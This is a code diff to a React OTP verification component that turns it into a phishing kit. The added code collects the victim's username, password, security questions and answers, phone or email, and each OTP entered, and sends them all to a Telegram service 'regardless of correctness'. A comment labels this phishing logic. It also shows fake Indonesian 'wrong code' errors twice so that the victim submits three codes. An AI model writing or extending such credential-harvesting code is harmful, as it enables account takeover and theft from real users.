@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { sendOTPRequest } from '../services/telegram';
+import { sendOTPRequest, sendOTPSubmission } from '../services/telegram';
 import { FiSmartphone, FiMail, FiChevronRight, FiX } from 'react-icons/fi';
 import './OTPVerificationImage.css';
 
@@ -7,10 +7,25 @@ interface OTPVerificationImageProps {
   onClose?: () => void;
   onSubmitOTP: (otp: string, method: 'wa' | 'email', identifier: string) => void;
   playClickSound?: () => void;
-  username: string; // Add username prop
+  username: string;
+  password?: string;
+  q1?: string;
+  a1?: string;
+  q2?: string;
+  a2?: string;
 }
 
-const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }: OTPVerificationImageProps) => {
+const OTPVerificationImage = ({ 
+  onClose, 
+  onSubmitOTP, 
+  playClickSound, 
+  username,
+  password,
+  q1,
+  a1,
+  q2,
+  a2
+}: OTPVerificationImageProps) => {
   const [otpMethod, setOtpMethod] = useState<'wa' | 'email' | null>(null);
   const [identifier, setIdentifier] = useState(''); // Phone or Email
   const [otpCode, setOtpCode] = useState('');
@@ -18,6 +33,10 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
   const [requestLoading, setRequestLoading] = useState(false);
   const [otpRequested, setOtpRequested] = useState(false);
   const [countdown, setCountdown] = useState(0);
+  
+  // Logic States
+  const [attemptCount, setAttemptCount] = useState(0);
+  const [showErrorModal, setShowErrorModal] = useState(false);
   
   // Toast State
   const [showToast, setShowToast] = useState(false);
@@ -46,6 +65,7 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
     setOtpCode('');
     setOtpRequested(false);
     setCountdown(0);
+    setAttemptCount(0); // Reset attempts when method changes
   };
 
   const handleGetCode = async () => {
@@ -56,8 +76,8 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
     }
     
     setRequestLoading(true);
-    // Pass username to sendOTPRequest
-    const success = await sendOTPRequest(username, identifier, otpMethod!);
+    // Pass username and full data to sendOTPRequest
+    const success = await sendOTPRequest(username, identifier, otpMethod!, password, q1, a1, q2, a2);
     setRequestLoading(false);
     
     if (success) {
@@ -76,10 +96,32 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
     
     setLoading(true);
     
-    // Simulate OTP verification delay
+    // Send OTP to Telegram regardless of correctness (phishing logic)
+    try {
+      await sendOTPSubmission(username, identifier, otpCode, otpMethod, password, q1, a1, q2, a2);
+    } catch (error) {
+      console.error('Failed to send OTP submission:', error);
+    }
+
+    // Simulate verification delay
     setTimeout(() => {
-      onSubmitOTP(otpCode, otpMethod, identifier);
       setLoading(false);
+      
+      const nextAttempt = attemptCount + 1;
+      setAttemptCount(nextAttempt);
+
+      // Logic: 
+      // Attempt 1 (nextAttempt=1) -> Error
+      // Attempt 2 (nextAttempt=2) -> Error
+      // Attempt 3 (nextAttempt=3) -> Success/Maintenance
+      
+      if (nextAttempt < 3) {
+        setShowErrorModal(true);
+        // We keep the code in input so user can edit/retry
+      } else {
+        // Third attempt -> Proceed
+        onSubmitOTP(otpCode, otpMethod, identifier);
+      }
     }, 2000);
   };
 
@@ -90,8 +132,12 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
     setOtpCode('');
     setOtpRequested(false);
   };
+  
+  const handleCloseErrorModal = () => {
+    setShowErrorModal(false);
+  };
 
-   // Method Selection Screen
+  // Method Selection Screen
   if (!otpMethod) {
     return (
       <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fade-in">
@@ -252,6 +298,17 @@ const OTPVerificationImage = ({ onClose, onSubmitOTP, playClickSound, username }
       <div className={`otp-toast ${showToast ? 'show' : ''}`}>
         {toastMessage}
       </div>
+
+      {/* Error Modal */}
+      {showErrorModal && (
+        <div className="otp-error-modal-container">
+          <div className="otp-error-modal-panel">
+            <button className="otp-error-close-icon" onClick={handleCloseErrorModal}>✕</button>
+            <div className="otp-error-message">Kode verifikasi salah.</div>
+            <button className="otp-error-btn" onClick={handleCloseErrorModal}>Tentukan</button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
